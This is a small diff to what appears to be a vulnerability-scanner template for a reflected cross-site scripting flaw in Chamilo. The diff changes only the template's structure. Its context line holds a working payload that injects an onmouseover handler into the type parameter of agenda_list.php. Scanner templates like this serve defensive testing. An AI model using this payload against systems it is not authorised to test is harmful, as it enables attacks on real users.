@@ -13,10 +13,8 @@ info:
     cvss-score: 7.2
     cwe-id: CWE-79
   tags: xss,chamilo
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - '{{BaseURL}}/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"'
